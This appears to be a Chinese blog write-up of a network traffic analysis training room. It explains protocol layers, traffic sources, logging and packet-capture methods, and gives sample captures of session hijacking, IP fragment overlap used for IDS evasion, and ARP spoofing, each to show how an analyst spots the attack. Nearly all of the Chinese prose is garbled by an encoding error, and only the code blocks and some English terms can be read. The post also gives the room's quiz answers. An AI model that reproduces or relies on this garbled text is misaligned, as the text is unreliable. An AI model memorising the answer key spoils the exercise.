éè¿ DNS èµ°ç§ C2 å½ä»¤çææ¯åç§°æ¯ä»ä¹ï¼</p>
<pre><code class="language-python">DNS Tunneling
</code></pre>
<h4 id="æä»¬å¯ä»¥è§å¯å°åªäºç½ç»æµé">æä»¬å¯ä»¥è§å¯å°åªäºç½ç»æµéï¼</h4>
<p>è¦å±ç°æä»¬è½å¤è§å¯å°çç½ç»æµéï¼æå¥½çæ¹æ³æ¯ä½¿ç¨å ä¹ææå¸¦ç½ç»æ¥å£çè®¾å¤é½å®ç°çæ¶æï¼TCP /IPåè®®æ ãä¸å¾å±ç¤ºäºTCP /IPæ¨¡åçä¸åå±ãæ¯ä¸å±é½æè¿°äºå°æ°æ®ä¼ éå°ä¸ä¸å±æéçä¿¡æ¯ï¼å¤´é¨ï¼ãæ¯ä¸ªå¤´é¨ä¸­åå«çä¿¡æ¯ï¼è¿ååºç¨ç¨åºæ°æ®ï¼æ­£æ¯æä»¬æ³è¦è§å¯çåå®¹ãæ¥å¿éå¸¸åå«è¿äºå¤´é¨çé¨åä¿¡æ¯ï¼ä½ä»æªåå«å®æ´çåè¯¦ç»ä¿¡æ¯ãè¿å°±æ¯æä»¬éè¦è¿è¡ç½ç»æµéåæçåå ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/9d8a1550a3c4ffb24ef6ce26c5b1b32b.png" alt="" loading="lazy"></p>
<p><strong>åºç¨</strong><br>
å±åå«ä¸¤ä¸ªéè¦çä¿¡æ¯ç»æï¼åºç¨å¤´é¨ä¿¡æ¯ååºç¨æ°æ®æ¬èº«ï¼ææè½½è·ï¼ãè¿äºä¿¡æ¯ä¼æ ¹æ®æä½¿ç¨çåºç¨å±åè®®èååãæä»¬æ¥çä¸ä¸ªHTTPçä¾å­ã</p>
<p>ä»¥ä¸ä»£ç çæ®µå±ç¤ºäºå®¢æ·ç«¯åé GET è¯·æ±çåºç¨ç¨åºæ å¤´åæå¡å¨çååºãå¤§å¤æ° Web ä»£çåé²ç«å¢é½ä¼è®°å½è¿äºæ å¤´æ°æ®ãä½å®ä»¬ä¸ä¼è®°å½åºç¨ç¨åºæ°æ®æææè´è½½ãä» GET è¯·æ±ä¸­ï¼æ¨å¯ä»¥ç¡®å®å®¢æ·ç«¯æ­£å¨è¯·æ±ä¸ä¸ªåä¸º <code>&lt;filename&gt;</code> çæä»¶<code>suspicious_package.zip</code>ãæå¡å¨çååºåå« 200 ä»£ç ï¼è¡¨ç¤ºè¯·æ±å·²è¢«æ¥åã<br>
ä½æ¯ï¼æ¨å¨æ¥å¿ä¸­çä¸å°çæ¯ ZIP æä»¶çåå®¹ï¼ç¨&lt;&lt;--ç¬¦å·æåºï¼ã</p>
<p><em>è¯·æ±</em></p>
<pre><code class="language-json">GET /downloads/suspicious_package.zip HTTP/1.1
Host: www.tryhackrne.thn
User-Agent: curl/7.85.0
Accept: */*
Connection: close
</code></pre>
<p><em>åå¤</em></p>
<pre><code class="language-json">HTTP/1.1 200 OK
Date: Mon, 29 Sep 2025 10:15:30 GMT
Server: nginx/1.18.0
Content-Type: application/zip
Content-Length: 10485760
Content-Disposition: attachment; filename="suspicious_package.zip"
Last-Modified: Mon, 29 Sep 2025 09:54:00 GMT
ETag: "5d8c72-9f8a1c-3a2b4c"
Accept-Ranges: bytes
Connection: close

[binary ZIP file bytes follow â 10,485,760 bytes]  &lt;&lt;--
</code></pre>
<p><strong>ä¼ è¾å±ï¼</strong><br>
åºç¨å±çæ°æ®åå¤´é¨ä¿¡æ¯ä¼è¢«åå²å¹¶å°è£ææ´å°ççæ®µãæ¯ä¸ªçæ®µé½åå«ä¸ä¸ªä¼ è¾å¤´é¨ï¼éå¸¸æ¯ TCP æ UDP åè®®ãè®©æä»¬æ¥çä¸ä¸ä¸é¢çé²ç«å¢æ¥å¿æ¡ç®ï¼</p>
<pre><code class="language-json">2025-10-13 09:15:32 ACCEPT TCP src=192.168.1.45 dst=172.217.22.14 sport=51432 dport=443 flags=SYN len=60
2025-10-13 09:15:32 ACCEPT TCP src=172.217.22.14 dst=192.168.1.45 sport=443 dport=51432 flags=SYN,ACK len=60
</code></pre>
<p>é²ç«å¢æ¥å¿éå¸¸åå«æºç«¯å£ãç®æ ç«¯å£åæ å¿ä½ï¼ä½å¶ä»å­æ®µéå¸¸ä¸åå«å¨åãç¶èï¼è¿äºå­æ®µå¯¹äºæ£æµæäºç±»åçæ»å»ï¼ä¾å¦ä¼è¯å«æï¼éå¸¸æä»·å¼ãå¯ä»¥éè¿åææ°æ®åå¤´é¨ä¸­ç<strong>åºåå·</strong>æ¥æ£æµ<strong>ä¼è¯å«æ</strong>ãå¦æåºåå·çªç¶åºç°è¾å¤§åå·®ï¼åéè¦è¿è¡è¿ä¸æ­¥è°æ¥ãä»¥ä¸è¾åºæ¾ç¤ºäºä½¿ç¨ Wireshark æè·çä¸ç³»åæ°æ®åã</p>
<pre><code class="language-json">No.     Time        Source          Destination     Protocol Length  Info
1       0.000000    192.168.1.45    172.217.22.14   TCP      74      51432 â 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460
2       0.000120    172.217.22.14   192.168.1.45    TCP      74      80 â 51432 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0 MSS=1460
3       0.000220    192.168.1.45    172.217.22.14   TCP      66      51432 â 80 [ACK] Seq=1 Ack=1 Win=64240 Len=0
4       0.010500    192.168.1.45    172.217.22.14   TCP      1514    51432 â 80 [PSH, ACK] Seq=1 Ack=1 Win=64240 Len=1460
5       0.010620    172.217.22.14   192.168.1.45    TCP      66      80 â 51432 [ACK] Seq=1 Ack=1461 Win=65535 Len=0
6       0.020100    192.168.99.200  172.217.22.14   TCP      74      51432 â 80 [PSH, ACK] Seq=34567232&lt;&lt;--è¿ä¸ª Ack=1 Win=64240 Len=20  
</code></pre>
<ul>
<li>åä¸è¡æ¾ç¤ºçæ¯æ­£å¸¸çTCPä¸æ¬¡æ¡æè¿ç¨ã</li>
<li>ç¬¬ 4 è¡åç¬¬ 5 è¡æ¾ç¤ºåæ³æ°æ®ä¼ è¾ã</li>
<li>ç¬¬ 6 è¡æ¾ç¤ºæ¥èªå¶ä»æºçæ°æ®åè¯å¾å°èªèº«æ³¨å¥ä¼è¯ãè¯·æ³¨æåºåå·çå¤§å¹è·³è·ã</li>
</ul>
<p><strong>å¨äºèç½ä¼ è¾è¿ç¨</strong>ä¸­ï¼å½ä¼ è¾å±åéä¸ä¸ªæ°æ®æ®µæ¶ï¼ç½ç»å±ä¹ä¼æ·»å å¶å¤´é¨ãå¦ææ°æ®æ®µå¤§äºæå¤§ä¼ è¾åå (MTU)ï¼åä¼è¢«åå²æå¤ä¸ªåçï¼å¹¶ä¸ºæ¯ä¸ªåçæ·»å å¤´é¨ãæå¸¸è®°å½çå­æ®µæ¯æº IP å°åãç®æ  IP å°ååçå­æ¶é´ (TTL)ãè¿å¯¹äºå¤§å¤æ°åºç¨åºæ¯æ¥è¯´å·²ç»è¶³å¤ãä½æ¯ï¼å¦ææä»¬æ³è¦æ£æµåçæ»å»ï¼ä¾å¦ï¼è¿éè¦æ£æ¥åçåç§»éåæ»é¿åº¦å­æ®µãåçæ»å»æå¤ç§åä½ãä¾å¦ï¼æ»å»èå¯ä»¥åå»ºæå°çåçæ¥ç»è¿å¥ä¾µæ£æµç³»ç» (IDS)ï¼æèéè¿ä½¿ç¨éå çå­èèå´æ¥å¹²æ°åççéç»ãä¸é¢çç¤ºä¾å±ç¤ºäºéå çå­èèå´ãç¬¬ 3 è¡çåç§»éä¸ç¬¬ 2 è¡çåç§»éOffsetéå ãè¿æå³çæ´ä¸ªæ°æ®åå¯ä»¥éè¿æç§æ¹å¼éç»ãæ»å»èå¯ä»¥å©ç¨è¿ç§ææ¯æ¥ç»è¿ IDSã</p>
<pre><code class="language-json">No.   Time       Source        Destination   Protocol Length Info
1     0.000000   203.0.113.45  192.168.1.10  UDP      1514    Fragmented IP protocol (UDP) (id=0x1a2b) [MF] Offset=0, Len=1480
2     0.000015   203.0.113.45  192.168.1.10  UDP      1514    Fragmented IP protocol (UDP) (id=0x1a2b) [MF] Offset=1480, Len=1480
3     0.000030   203.0.113.45  192.168.1.10  UDP       600    Fragmented IP protocol (UDP) (id=0x1a2b) Offset=1480, Len=64   &lt;-- Overlap
4     0.000045   192.168.1.10  203.0.113.45  ICMP      98     Destination unreachable (Fragment reassembly time exceeded)
</code></pre>
<p><strong>é¾è·¯</strong><br>
å±å®æå°è£åï¼IP æ°æ®åä¼è¢«åéå°é¾è·¯å±ãé¾è·¯å±ä¹ä¼æ·»å èªå·±çå¤´é¨ï¼å¶ä¸­åå«æ´å¤å¯»åä¿¡æ¯ãå¤§å¤æ°æ¥å¿ä¼æ¾ç¤ºæº MAC å°ååç®æ  MAC å°åãä½å¯¹äºæäºç±»åçæ»å»ï¼ä¾å¦ ARP æ¬ºéªæææ¯æ»å»ï¼æ¥å¿ä¸­çä¿¡æ¯å¯è½ä¸è¶³ä»¥åºå¯¹ãå¯¹äºè¿ç±»æ»å»ï¼æä»¬éè¦å®æ´çæ°æ®ååå¶ä¸ä¸æãä¾å¦ï¼æ¥å¿æ æ³æ¾ç¤º MAC å°åæ¯å¦åºç°å¨å¤ä¸ªæ¥å£ä¸ï¼æèæ¯å¦åéäºè®¸å¤ MAC å°åå²çªçåè´¹ ARP æ°æ®åãä»¥ä¸ç¤ºä¾å±ç¤ºäºä¸ä¸ª ARP ææ¯æ»å»çæ°æ®åæè·ãIP å°åä¸º 192.168.1.200 çä¸»æºä½¿ç¨ç¸åç MAC å°ååå¤æ¯ä¸ª ARP è¯·æ±ã</p>
<pre><code class="language-json">No.   Time       Source           Destination      Protocol Length Info
1     0.000000   192.168.1.1      Broadcast        ARP      60     Who has 192.168.1.10? Tell 192.168.1.1
2     0.000025   192.168.1.10     192.168.1.1      ARP      60     192.168.1.10 is at 00:11:22:33:44:55
3     1.002010   192.168.1.200    192.168.1.1      ARP      60     192.168.1.10 is at aa:bb:cc:dd:ee:ff  &lt;-- Attacker spoof
4     1.002015   192.168.1.200    192.168.1.10     ARP      60     192.168.1.1 is at aa:bb:cc:dd:ee:ff  &lt;-- Attacker spoof
5     1.100000   192.168.1.10     172.217.22.14    TCP      74     54433 â 80 [SYN] Seq=0 Win=64240 Len=0
6     1.100120   192.168.1.200    172.217.22.14    TCP      74     54433 â 80 [SYN] Seq=0 Win=64240 Len=0  &lt;-- Relayed via attacker
</code></pre>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢ã</p>
<p>è¯·æ¥çä»»å¡ä¸­ç HTTP ç¤ºä¾ï¼å¹¶åç­ä»¥ä¸é®é¢ï¼HTTP ååºä¸­åå«ç ZIP éä»¶çå¤§å°æ¯å¤å°ï¼è¯·ä»¥å­èä¸ºåä½è®°ä¸ç­æ¡ã</p>
<pre><code class="language-python">10485760
</code></pre>
<p>æ»å»èä½¿ç¨åªç§æ»å»æ¹å¼æ¥è¯å¾ç»è¿å¥ä¾µæ£æµç³»ç» (IDS)ï¼</p>
<pre><code class="language-python">fragmentation
</code></pre>
<p>æä»¬å¯ä»¥ä½¿ç¨ TCP æ¥å¤´ä¸­çåªä¸ªå­æ®µæ¥æ£æµä¼è¯å«æï¼</p>
<pre><code class="language-python">sequence number
</code></pre>
<h4 id="ç½ç»æµéæ¥æºåæµå">ç½ç»æµéæ¥æºåæµå</h4>
<p>å¨ä¹åçä»»å¡ä¸­ï¼æä»¬è®¨è®ºäºåºäºTCP /IP åè®®æ ççè®ºè§å¯ç»æãå®éä¸ï¼å³æ³¨å·ä½çæºåæµæ´æå¸®å©ãä¼ä¸ç½ç»éå¸¸æä¸äºé¢åç¡®å®çç½ç»æµåæºãæä»¬å¯ä»¥å°è¿äºæºåä¸ºä¸¤ç±»ï¼</p>
<ul>
<li>ä¸­ä»</li>
<li>ç«¯ç¹</li>
</ul>
<p>æä»¬è¿å¯ä»¥å°è¿äºæµéåä¸ºä¸¤ç±»ï¼</p>
<ul>
<li>åååï¼è¿åºå±åç½å¹¶ç»è¿é²ç«å¢çæµé</li>
<li>ä¸è¥¿åï¼æå±åç½åçæµéï¼åæ¬å»¶ä¼¸å°äºç«¯çå±åç½æµéï¼ã</li>
</ul>
<p>ä¸é¢æä»¬éä¸æ¢è®¨å®ä»¬ã</p>
<h5 id="æ¥æº">æ¥æº</h5>
<p>å¦åæè¿°ï¼ç½ç»æµéæ¥æºæä¸¤ç§ï¼ç»ç«¯è®¾å¤åä¸­é´è®¾å¤ãè¿äºè®¾å¤æ¢å­å¨äºå±åç½ (LAN) ä¸­ï¼ä¹å­å¨äºå¹¿åç½ (WAN) ä¸­ã</p>
<p><strong>ä¸­é´æºï¼</strong><br>
è¿äºè®¾å¤æ¯æµéçä¸»è¦ééãè½ç¶å®ä»¬ä¹ä¼äº§çä¸äºæµéï¼ä½è¿ä½äºç»ç«¯è®¾å¤äº§ççæµéãæ­¤ç±»è®¾å¤åæ¬é²ç«å¢ãäº¤æ¢æºãWebä»£çãå¥ä¾µæ£æµç³»ç»(IDS)ãå¥ä¾µé²å¾¡ç³»ç»(IPS)ãè·¯ç±å¨ãæ¥å¥ç¹ãæ çº¿å±åç½æ§å¶å¨ç­ç­ãæè®¸ä¸æä»¬å³ç³»ä¸å¤§ï¼ä½äºèç½æå¡æä¾åçææåºç¡è®¾æ½ä¹å±äºæ­¤ç±»ã</p>
<p>è¿äºè®¾å¤äº§ççæµéæ¥èªè·¯ç±åè®®ï¼EIGRPãOSPFãBGPï¼ãç®¡çåè®®ï¼SNMPãPINGï¼ãæ¥å¿åè®®ï¼SYSLOGï¼åå¶ä»æ¯æåè®®ï¼ARPãSTPãDHCPï¼ç­æå¡ã</p>
<p><strong>ç»ç«¯æºï¼</strong><br>
è¿äºæ¯æµéçèµ·å§ç¹åç»ç¹ãç»ç«¯è®¾å¤å ç¨å¤§é¨åç½ç»å¸¦å®½ãå±äºè¿ä¸ç±»å«çè®¾å¤åæ¬æå¡å¨ãä¸»æºãç©èç½è®¾å¤ãæå°æºãèææºãäºèµæºãç§»å¨çµè¯ãå¹³æ¿çµèç­ç­ã</p>
<h5 id="æµé">æµé</h5>
<p>ç½ç»æµééå¸¸åå³äºç½ç»ä¸­å¯ç¨çæå¡ï¼ä¾å¦ Active DirectoryãSMBãHTTPS ç­ãå¨å¸åçä¼ä¸ç½ç»ä¸­ï¼æä»¬å¯ä»¥å°è¿äºæµéåä¸ºåååæµéåä¸è¥¿åæµéã</p>
<p><strong>åååæµé</strong><br>
ï¼NSæµéï¼éå¸¸å¨å±åç½ï¼LANï¼åå¹¿åç½ï¼WANï¼ä¹é´ååæµå¨æ¶åå°å¯åçæ§ãæ­¤ç±»æµéä¸­æå¸¸è§çæ¯å®¢æ·ç«¯-æå¡å¨åè®®ï¼ä¾å¦HTTPSãDNSãSSHãVPNãSMTPãRDPç­ç­ãæ¯ç§åè®®é½æä¸¤ä¸ªæµï¼å¥ç«ï¼ingressï¼ååºç«ï¼egressï¼ãææè¿äºæµéé½ä¼ä»¥æç§æ¹å¼ç»è¿é²ç«å¢ãæ­£ç¡®éç½®é²ç«å¢è§ååæ¥å¿è®°å½æ¯å®ç°æµéå¯è§æ§çå³é®ã</p>
<p><strong>ä¸è¥¿åæµé</strong><br>
ï¼EWæµéï¼éå¸¸åªå¨ä¼ä¸å±åç½åä¼ è¾ï¼å æ­¤çæ§è¾å°ãç¶èï¼è·è¸ªè¿äºæµéè³å³éè¦ãå½ç½ç»é­å°å¥ä¾µæ¶ï¼æ»å»èå¾å¾ä¼å©ç¨åé¨ä¸åçæå¡å¨ç½ç»ä¸­æ¨ªåç§»å¨ãå¦ä¸æç¤ºï¼æ­¤ç±»æå¡ç§ç±»ç¹å¤ãç¹å»æ¯ä¸ªç±»å«å³å¯æ¥çå¶åå«çæå¡ã</p>
<p>ç®å½ãèº«ä»½éªè¯åèº«ä»½æå¡</p>
<ul>
<li>Kerberos /LDAPï¼èº«ä»½éªè¯/å¯¹ Active Directory çæ¥è¯¢</li>
<li>RADIUS/TACACS+ï¼ç½ç»è®¿é®æ§å¶</li>
<li>è¯ä¹¦é¢åæºæé¢ååé¨è¯ä¹¦</li>
</ul>
<p>æä»¶å±äº«åæå°æå¡</p>
<ul>
<li>SMB /CIFSï¼è®¿é®ç½ç»é©±å¨å¨</li>
<li>IPP/LPDï¼ç½ç»æå°</li>
</ul>
<p>è·¯ç±å¨ãäº¤æ¢æºååºç¡è®¾æ½æå¡</p>
<ul>
<li>ä¸»æºä¸DHCPæå¡å¨ä¹é´çDHCPéä¿¡</li>
<li>ARPå¹¿æ­æ¶æ¯</li>
<li>åé¨DNS</li>
<li>è·¯ç±åè®®æ¶æ¯</li>
</ul>
<p>åºç¨éä¿¡</p>
<ul>
<li>æ°æ®åºè¿æ¥ï¼åºäºTCP çSQL</li>
<li>å¾®æå¡ APIï¼æå¡ä¹é´çRESTæ gRPC è°ç¨</li>
</ul>
<p>å¤ä»½ä¸å¤å¶</p>
<ul>
<li>æä»¶å¤å¶ï¼å¨æ°æ®ä¸­å¿ä¹é´æå¤å¶å°å¤ä»½æå¡å¨</li>
<li>æ°æ®åºå¤å¶ï¼MySQL äºè¿å¶æ¥å¿å¤å¶ãPostgreSQL æµå¼å¤å¶ç­ç­</li>
</ul>
<p>çæ§ä¸ç®¡ç</p>
<ul>
<li>SNMPï¼è®¾å¤å¥åº·ææ </li>
<li>ç³»ç»æ¥å¿ï¼éä¸­å¼æ¥å¿è®°å½</li>
<li>NetFlow / IPFIXï¼æµéé¥æµ</li>
<li>å¶ä»ç«¯ç¹æ¥å¿ä¼åéå°ä¸­å¤®æ¥å¿æå¡å¨</li>
</ul>
<h5 id="æµç¨ç¤ºä¾">æµç¨ç¤ºä¾</h5>
<p>è®©æä»¬éè¿å¯è§åçæ¹å¼æ¥çä¸ä¸ä¸é¢æå°çä¸äºç½ç»æµéã</p>
<p><strong>HTTPS</strong><br>
æå¤ç§ä¸åçç½ç»æµéæµãæä»¬æ¥çä¸ä¸ª Webä»£çæ§è¡TLSæ£æ¥çæµï¼<br>
ä¸»æºè¯·æ±è®¿é®æä¸ªç½ç«ï¼è¯¥è¯·æ±è¢«åéå°ä¸ä¸ä»£é²ç«å¢ (NGFW)ï¼å¶ä¸­åå«ä¸ä¸ª Webä»£çãWebä»£çåå½ Web æå¡å¨ï¼åæ¶ä¸å®éç Web æå¡å¨å»ºç«ä¸ä¸ªæ°çTCPä¼è¯ï¼å¹¶å°å®¢æ·ç«¯çè¯·æ±è½¬ååºå»ãå½ Webä»£çæ¶å° Web æå¡å¨çååºæ¶ï¼å®ä¼æ£æ¥ååºåå®¹ï¼å¦æè®¤ä¸ºå®å¨ï¼åå°å¶è½¬åç»ä¸»æºãæ»èè¨ä¹ï¼è¿éæä¸¤ä¸ªä¼è¯ï¼ä¸ä¸ªå¨å®¢æ·ç«¯åä»£çä¹é´ï¼å¦ä¸ä¸ªå¨ä»£çå Web æå¡å¨ä¹é´ãä»å®¢æ·ç«¯çè§åº¦æ¥çï¼å®å·²ç»ä¸ Web æå¡å¨å»ºç«äºä¸ä¸ªä¼è¯ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/53a59fe5dcfd3f5124649caf2bdb0a4e.png" alt="" loading="lazy"></p>
<p><strong>ä¼ä¸ç½ç»åé¨çå¤é¨DNS</strong><br>
éä¿¡å§äºä¸»æºåéDNSæ¥è¯¢ãä¸»æºå°æ¥è¯¢åéå°ç«¯å£ 53 çåé¨DNSæå¡å¨ï¼è¯¥æå¡å¨å°ä»£è¡¨ä¸»æºæ§è¡æä½ãé¦åï¼å®ä¼æ£æ¥ç¼å­ä¸­æ¯å¦æè¯¥æ¥è¯¢çç­æ¡ï¼å¦ææ²¡æï¼å®ä¼å°æ¥è¯¢éè¿è·¯ç±å¨åé²ç«å¢åéå°å·²éç½®çDNSæå¡å¨ãç¶åï¼ç­æ¡å°æ²¿çç¸åçè·¯å¾å°è¾¾åé¨DNS æå¡å¨ï¼æç»ç±åé¨ DNSæå¡å¨è½¬åç»ä¸»æºãä¸å¾æ¾ç¤ºäºä¸ä¸ªç®åçæµç¨å¾ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/015959337deb214093fccd2ba8d3236c.png" alt="" loading="lazy"></p>
<p><strong>ä½¿ç¨KerberosçSMB åè®®ï¼</strong><br>
å½ä¸»æºæå¼ä¸ä¸ªå±äº«æä»¶å¤¹ï¼ä¾å¦ \FILESERVER\MARKETINGï¼æ¶ï¼ä¼å»ºç«ä¸ä¸ªSMBä¼è¯ãé¦åï¼éè¿Kerberosè¿è¡èº«ä»½éªè¯ãå½ç¨æ·ç»å½ä¸»æºæ¶ï¼å®ä¼ååæ§å¶å¨ä¸çå¯é¥ååä¸­å¿<strong>è¿è¡èº«ä»½éªè¯ï¼å¹¶æ¶å°ä¸ä¸ªç¥¨è¯æäºç¥¨æ® (TGT)ï¼ç¨äºè¯·æ±âæå¡èº«ä»½éªè¯ç¥¨æ®â</strong>ãç¶åï¼ä¸»æºä½¿ç¨ä¹åæ¶å°ç TGT è¯·æ±æå¡ç¥¨æ®ãä¸»æºéåä½¿ç¨æ­¤ç¥¨æ®å»ºç«SMBè¿æ¥ãSMB ä¼è¯å»ºç«åï¼ä¸»æºå³å¯è®¿é®è¯¥å±äº«æä»¶å¤¹ãä¸å¾æ¯è¯¥æµç¨çç®åç½ç»å¾ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/5ac5db973b430643747ba89a7e757297.png" alt="" loading="lazy"></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢ã</p>
<p>ç½ç»ä¸­åªç±»è®¾å¤äº§ççæµéæå¤§ï¼</p>
<pre><code class="language-python">endpoint
</code></pre>
<p>å»ºç« SMB ä¼è¯ä¹åï¼éè¦åèç³»åªä¸ªæå¡è¿è¡èº«ä»½éªè¯ï¼</p>
<pre><code class="language-python">kerberos
</code></pre>
<p>TLSæ¯ä»ä¹çç¼©åï¼</p>
<pre><code class="language-python">Transport Layer Security
</code></pre>
<h4 id="æä»¬å¦ä½è§å¯ç½ç»æµé">æä»¬å¦ä½è§å¯ç½ç»æµé?</h4>
<p>æ¢ç¶æä»¬å·²ç»äºè§£äºç½ç»ä¸­å¯ä»¥ä¸åºè¯¥è§å¯çåå®¹ï¼æ¥ä¸æ¥è®©æä»¬ççå¦ä½è¿è¡è§å¯ãæ­£å¦å¼è¨ä¸­æè¿°ï¼ç½ç»æµéåæä¾§éäºæ´åå¤ç§ä¿¡æ¯æºï¼å¯¹å¶è¿è¡åæï¼åç°å¶ä¸­çæ¨¡å¼ï¼å¹¶å©ç¨åæç»ææå¯¼åç»­è¡å¨ã</p>
<p>æä»¬å¯ä»¥éè¿å¤ç§æ¹å¼è·åè¿äºä¿¡æ¯æ¥æºï¼</p>
<ul>
<li>æ¥å¿</li>
<li>å®æ´æ°æ®åæè·</li>
<li>ç½ç»ç»è®¡</li>
</ul>
<h5 id="æ¥å¿">æ¥å¿</h5>
<p>æ¥å¿æ¯æä»¬è·åç½ç»è¿è¡ä¿¡æ¯çé¦è¦éå¾ãç½ç»ä¸­çæ¯ä¸ªç³»ç»ååè®®é½åå«è®°å½ä¿¡æ¯çæ¹å¼ãéè¦æ³¨æçæ¯ï¼ç®åå¹¶æ²¡æéç¨äºææç³»ç»ååè®®çéç¨æ¥å¿è®°å½æ åãæ¯ä¸ªååé½ä¼èªè¡éæ©æ¥å¿è®°å½çå®ç°æ¹å¼ãä¾å¦ï¼å¾®è½¯å®ç°äº Windows äºä»¶æ¥å¿ãæ­¤å¤ï¼è®°å½åªäºæ°æ®ä¹åå³äºååãå¤§å¤æ°ååä¸ä¼è®°å½æ°æ®åè¿åºç³»ç»æ¶çå®æ´ä¿¡æ¯ï¼èæ¯ä¼è®°å½ä¸äºä»ä»¬è®¤ä¸ºæç¨çå­æ®µï¼ä¾å¦æº IP å°ååç®æ  IP å°åãå¨ä¸é¢çç»ç«¯ä¸­ï¼æä»¬å¯ä»¥çå°ä¸äºç¤ºä¾æ¥å¿ï¼ä¾å¦ä½¿ç¨ Syslog æ ¼å¼çLinuxä¸»æºèº«ä»½éªè¯æ¥å¿åä½¿ç¨ CLF æ åçApache Web æå¡å¨è®¿é®æ¥å¿ã</p>
<pre><code class="language-bash"># Auth log
Oct  8 11:20:15 web01 sshd[2145]: Accepted password for gensane from 192.168.1.50 port 52234 ssh2

# Apache web server access log
192.168.1.50 - - [08/Oct/2025:11:20:18 +0200] "GET /index.html HTTP/1.1" 200 2326 "-" "Mozilla/5.0"
</code></pre>
<p>å°½ç®¡æ²¡ææ åçæ¥å¿è®°å½æ¹å¼ï¼ä½æä¸äºåè®®æä¾äºä¸ç§å°æ¥å¿æ¶æ¯ä»è®¾å¤åéå°æ¶éå¨çæ ååæ¹å¼ï¼ä¾å¦ Syslog å SNMPã</p>
<p>å½æ¥å¿æä¾çä¿¡æ¯ä¸è¶³æ¶ï¼æä»¬å¿é¡»æ·±å¥ææãä¸ºæ­¤ï¼æä»¬éè¦å³èæ¥å¿ãæ£æ¥å®æ´çæ°æ®åæè·å¹¶æ¥çç½ç»ç»è®¡ä¿¡æ¯ã</p>
<h5 id="å®æ´æ°æ®åæè·">å®æ´æ°æ®åæè·</h5>
<p>å¨ä»»å¡ä¸ä¸­ï¼æä»¬è®¨è®ºäºå®æ´æ°æ®åçç»æãç°å¨ï¼æä»¬æ³ç¥éå¦ä½æè·åæ£æ¥è¿äºæ°æ®åãä¸ºæ­¤ï¼æä»¬æä¸¤ç§éæ©ï¼</p>
<ul>
<li>å®è£ç©çç½ç»åè·¯å¨</li>
<li>éç½®ç«¯å£éå</li>
</ul>
<p><strong>ç½ç»åè·¯å¨ï¼Network</strong><br>
TAPï¼æ¯ä¸ç§å¯ä»¥ä¸²èå°ç½ç»ä¸­çç©çè®¾å¤ãè¿äºè®¾å¤ä¼å¤å¶ææç»è¿çç½ç»æµéï¼èä¸ä¼å½±åç½ç»æ§è½ãå¤å¶çæ°æ®éåä¼éè¿ä¸ç¨ççæ§ç«¯å£è½¬åå°æ°æ®åæè·è®¾å¤ãå¥ä¾µæ£æµç³»ç»ï¼IDSï¼æå¶ä»ç³»ç»ãå¼å¾æ³¨æçæ¯ï¼ç½ç»åè·¯å¨ä»å¨ TCP/IP æ¨¡åçé¾è·¯å±å·¥ä½ï¼å®ä¸éè¦ MAC æ IP å°åï¼å ä¸ºå®å¤å¶çæ¯çµä¿¡å·/åä¿¡å·å¹¶å°å¶åéå°çæ§ç«¯å£ãè¿æ ·ï¼å°±ä¸ä¼å¢å ç½ç»å»¶è¿ãä¸å¾å±ç¤ºäºä¸ä¸ªç½ç»åè·¯å¨çç¤ºä¾ã</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/d5a6bbb846daf8dd74a8f448fa72c3e8.png" alt="" loading="lazy"></p>
<p><strong>ç«¯å£</strong><br>
éåæ¯ä¸ç§è½¯ä»¶æ¹æ³ï¼ç¨äºå°æ°æ®åä»ä¸­é´è®¾å¤ä¸çä¸ä¸ªç«¯å£å¤å¶å°è¿æ¥å°ä¾å¦å¥ä¾µæ£æµç³»ç» (IDS)ãæ°æ®åæè·è®¾å¤æå¶ä»ç³»ç»çå¦ä¸ä¸ªç«¯å£ãæ¯ä¸ªååé½æèªå·±çå½åãä¾å¦ï¼æç§ç§°ä¹ä¸º SPANãå¨ä¸é¢çç»ç«¯ä¸­ï¼æä»¬å¯ä»¥çå°å¦ä½å¨æç§è®¾å¤ä¸éç½® SPANãå¨æ¬ä¾ä¸­ï¼ç»è¿çæ°æ®å<code>fastEthernet0/1</code>å°è¢«å¤å¶å¹¶åéå°å¦ä¸ä¸ªç«¯å£<code>fastEthernet0/2</code>ã</p>
<pre><code class="language-json">Switch(config)# monitor session 1 source interface fastEthernet0/1
Switch(config)# monitor session 1 destination interface fastEthernet0/2
</code></pre>
<p>ä¸å¾å±ç¤ºäºå¶å·¥ä½åçãWIN-001 éè¿äº¤æ¢æºåéæ°æ®åä¸æå¡å¨éä¿¡ãæ°æ®åå°è¾¾äº¤æ¢æºåï¼ä¼è¢«å¤å¶ä¸ä»½å¹¶åéå°çæ§è®¾å¤ã</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/c0486d6d1ab0dc7d601e718ecd239030.png" alt="" loading="lazy"></p>
<p>è¯·æ³¨æï¼ä¸­é´è®¾å¤ä¸ä¸å®æ¯ç©çè®¾å¤ï¼ç«¯å£éåä¹å¯ä»¥éç½®å¨èæè®¾å¤ä¸ï¼ä¾å¦ VMware vSwitchãäºç¯å¢ä¹æä¾ä¸é¨çéåæå¡ãä¾å¦ï¼AWS æä¾ VPC æµééåã</p>
<p><strong>æä½³å®è·µï¼</strong><br>
è¿è¡å®æ´æ°æ®åæè·æ¶ï¼æä»¬éè¦èèä»¥ä¸å ä¸ªæ¹é¢ï¼</p>
<ul>
<li>æ¾ç½®ä½ç½®ï¼æ ¹æ®æä»¬è¦æè·çæµéç±»åï¼æä»¬éè¦å° TAP æ¾ç½®å¨æ­£ç¡®çä½ç½®æå°éåéç½®å¨æ­£ç¡®çä½ç½®ã</li>
<li>æç»­æ¶é´ï¼å®æ´çæ°æ®åæè·éè¦ç¸åºçå­å¨ç©ºé´ãå¦æå¨ 1 Gbps ççº¿è·¯ä¸æè·ä¸æ´å¤©çæµéï¼å¹³åéè¦ 10.8 TB çå­å¨ç©ºé´ãæ³è±¡ä¸ä¸ï¼å¨ 10Gb æ 40Gb ççº¿è·¯ä¸ï¼æä»¬éè¦å¤å°å­å¨ç©ºé´ã</li>
